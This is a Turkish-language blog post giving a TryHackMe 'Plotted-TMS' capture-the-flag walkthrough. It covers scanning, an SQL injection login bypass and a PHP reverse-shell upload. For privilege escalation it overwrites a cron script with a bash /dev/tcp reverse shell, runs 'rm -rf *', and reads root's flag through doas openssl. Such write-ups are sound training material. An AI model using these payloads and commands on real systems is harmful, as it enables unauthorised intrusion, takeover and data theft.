<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>THM Plotted-TMS Çözüm | order6tyfix</title>
  <meta name="author" content="order6tyfix">
  
  <meta name="description" content="Recon(Bilgi Toplama)
Nmap taramasıyla başlıyorum.
1234567891011121314nmap -sS -sV 10.10.106.251Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-22 23:03 +03Nmap scan report for 10.10.106.251Host is up (0.097s latency).Not shown: 997 closed portsPORT    STATE SERVICE VERSION22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 19.88 seconds


80 ve 445 portlarında apache sunucu barınıyor ve site PHPSESSID‘den anladığım kadarıyla php ile kodlanmış. Tarayıcıda siteyi açtığımda öntanımlı apache sayfası var.dirb ile sunucudaki alt dizinleri listelemek mantıklı.
12345678910111213dirb 10.10.106.251GENERATED WORDS: 4612                                                          ---- Scanning URL: http://10.10.106.251/ ----==&amp;gt; DIRECTORY: http://10.10.106.251/admin/                                           + http://10.10.106.251/index.html (CODE:200|SIZE:10918)                              + http://10.10.106.251/passwd (CODE:200|SIZE:25)                                     + http://10.10.106.251/server-status (CODE:403|SIZE:278)                             + http://10.10.106.251/shadow (CODE:200|SIZE:25)">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="THM Plotted-TMS Çözüm"/>
  <meta property="og:site_name" content="order6tyfix"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-70812759-1', 'auto');
  ga('send', 'pageview');
</script>



<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


<meta name="generator" content="Hexo 6.0.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">order6tyfix</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Arsiv
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>Kategoriler
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Etiketler
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>Hakkımda
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> THM Plotted-TMS Çözüm</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="Recon-Bilgi-Toplama"><a href="#Recon-Bilgi-Toplama" class="headerlink" title="Recon(Bilgi Toplama)"></a>Recon(Bilgi Toplama)</h1><hr>
<p>Nmap taramasıyla başlıyorum.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV 10.10.106.251</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-22 23:03 +03</span><br><span class="line">Nmap scan report for 10.10.106.251</span><br><span class="line">Host is up (0.097s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.88 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>80 ve 445 portlarında apache sunucu barınıyor ve site <code>PHPSESSID</code>‘den anladığım kadarıyla php ile kodlanmış. Tarayıcıda siteyi açtığımda öntanımlı apache sayfası var.<code>dirb</code> ile sunucudaki alt dizinleri listelemek mantıklı.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dirb 10.10.106.251</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.10.106.251/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.106.251/admin/                                           </span><br><span class="line">+ http://10.10.106.251/index.html (CODE:200|SIZE:10918)                              </span><br><span class="line">+ http://10.10.106.251/passwd (CODE:200|SIZE:25)                                     </span><br><span class="line">+ http://10.10.106.251/server-status (CODE:403|SIZE:278)                             </span><br><span class="line">+ http://10.10.106.251/shadow (CODE:200|SIZE:25)                                     </span><br><span class="line">                                                      </span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>İşe yarar bir şey yok. Bir de 445 portuna göz atacağım.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb 10.10.106.251:445</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DIRECTORY: http://10.10.106.251:445/management/</span><br></pre></td></tr></table></figure>
<p>mangement dizini altında bir web sitesi barınıyor.</p>
<h1 id="EXPLOITATION-Sistemi-Somurme"><a href="#EXPLOITATION-Sistemi-Somurme" class="headerlink" title="EXPLOITATION(Sistemi Sömürme)"></a>EXPLOITATION(Sistemi Sömürme)</h1><hr>
<p>Bu dizin işe yarayacak gibi. Login’e tıkladığımda admin giriş paneli geliyor karşıma. İlk denediğim şey admin-admin ile giriş yapmaya çalışmak ama işe yaramıyor. SQLi işe yarayabilir.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username : admin&#x27; OR &#x27;1&#x27;=&#x27;1-- -</span><br><span class="line">password : $RASTGELE</span><br></pre></td></tr></table></figure>

<p>username kısmına girdi olarak yazdığım <code>admin&#39; OR &#39;1&#39;=&#39;1-- -</code> ifadesini parçalara ayırırsam:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; =&gt; admin olarak giriş yapmak için,</span><br><span class="line">OR &#x27;1&#x27;=&#x27;1 =&gt; SQL sorgusunun her zaman doğru olması için,</span><br><span class="line">-- - =&gt; bu ifadeden sonrasının SQL sorgusuna dahil edilmemesi için. </span><br><span class="line">Yani girdiğim password&#x27;un hiçbir önemi yok.</span><br></pre></td></tr></table></figure>

<p>Artık giriş yaptım. Panelde dolaşırken avatarımı değiştirebildiğimi farkettim(<a target="_blank" rel="noopener" href="http://10.10.224.198:445/management/admin/?page=user">http://10.10.224.198:445/management/admin/?page=user</a>). Bu atak vektöründen ilerleyerek reverse shell alabilirim. Php ile reverse shell almak mantıklı olur.</p>
<p>Bu <a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">kod</a> işimi görür. Portu 1234 seçtim.Siz $port ve $ip kısımlarını kendinize göre düzenleyeceksiniz. Önce <code>nc -lvnp 1234</code> ile 1234 portunu dinlemeye alıyorum. Ardından shell.php dosyamı seçiyorum ve update’e bastığımda reverse shell, dinlemeye aldığım 1234 portuna geldi.</p>
<h1 id="PRIV-ESC-Yetki-Yukseltme"><a href="#PRIV-ESC-Yetki-Yukseltme" class="headerlink" title="PRIV ESC(Yetki Yükseltme)"></a>PRIV ESC(Yetki Yükseltme)</h1><hr>
<p>İlk denediğim şey sudo ile çalıştırabileceğim komutları bulmak. Fakat işe yarar bir şey yok. SUID ve GUID bitlerinden de bir şey çıkmadı. Crontab dosyasından belki bir şeyler yakalayabilirim. Bu dosyada periyodik olarak çalıştırılan <a target="_blank" rel="noopener" href="https://ceaksan.com/tr/cronjob-nedir-nasil-kullanilir">cronjob</a>‘ların listesi var. <code>cat /etc/crontab</code> ile dosya içeriğini okuduğumda plot_admin kullanıcısı tarafından her dakika çalıştırılan <code>/var/www/scripts/backup.sh</code> dikkatimi çekti. <code>ls -la</code> ile scripts dizini üzerindeki yetkime baktığımda:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  4 root     root     4096 Oct 28 10:26 .</span><br><span class="line">drwxr-xr-x 14 root     root     4096 Oct 28 07:07 ..</span><br><span class="line">drwxr-xr-x  4 root     root     4096 Oct 28 09:18 html</span><br><span class="line">drwxr-xr-x  2 www-data www-data 4096 Oct 28 09:10 scripts</span><br></pre></td></tr></table></figure>


<p>dizin üzerinde yetki sahibiyim. Bu da demek oluyor ki backup.sh dosyasını silebilir, yeni bir backup.sh dosyası oluşturup plot_admin kullanıcısı olarak reverse shell almamı sağlayacak bir bash kodu yerleştirebilirim. Önce 5555 portunu <code> nc -lvnp 5555</code> ile dinlemeye aldım . Ardından <code>rm -rf *</code> ile var/www/scripts içindeki backup.sh’ı sildim ve<code>echo &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.8.216.50/5555 0&gt;&amp;1&#39;&quot; &gt; backup.sh</code> ile backup.sh içine reverse shell almamı sağlayacak kodu yerleştirdim. <code>chmod +x backup.sh</code> ile dosyaya çalıştırma izni verdikten sonra tek yapmam gereken beklemek.</p>
</br>

<p>plot_admin olarak shell aldım. İlk yaptığım şey gene <code>sudo -l</code> denemek fakat işe yaramadı. SUID ve GUID bitlerine sahip dosyalara baktığımda. <code>/usr/bin/doas</code> ilgimi çekti çünkü <code>doas</code>, sudo gibi sistemdeki başka bir kullanıcının kimliğini üstlenmek için kullanılabilir. <code>cat /etc/doas.conf</code> ile config dosyasını okuduğumda <code>openssl</code>‘i root yetkisiyle çalıştırabileceğimi öğrendim. Artık son flag’i de gtfobins’den bulduğum openssl ile dosya okumama olanak sağlayan komut ile okuyabilirim.<code>doas openssl enc -in /root/root.txt</code>.</p>
	  
	</div>

	<div>
  	<center>
	<div class="pagination">

    
    
    <a href="/2022/02/25/THM-Borderlands/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> önceki yazı</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Ana menü</a>
    
    <a href="/2022/02/16/THM-Dogcat-Cozum/" type="button" class="btn btn-default ">sonraki yazı<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>
	
	<!-- comment -->
	
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>


	</div> <!-- col-md-9/col-md-12 -->
		
	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2022-02-23 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/CTF-Cozum/">CTF Çözüm<span>4</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/SUID-GUID/">SUID, GUID<span>1</span></a></li> <li><a href="/tags/SQLi/">SQLi<span>1</span></a></li> <li><a href="/tags/Crontab/">Crontab<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

	</div>
		

</div><!-- row -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
I'm gonna be on television.
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎YUKARI</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>


</body>
   </html>
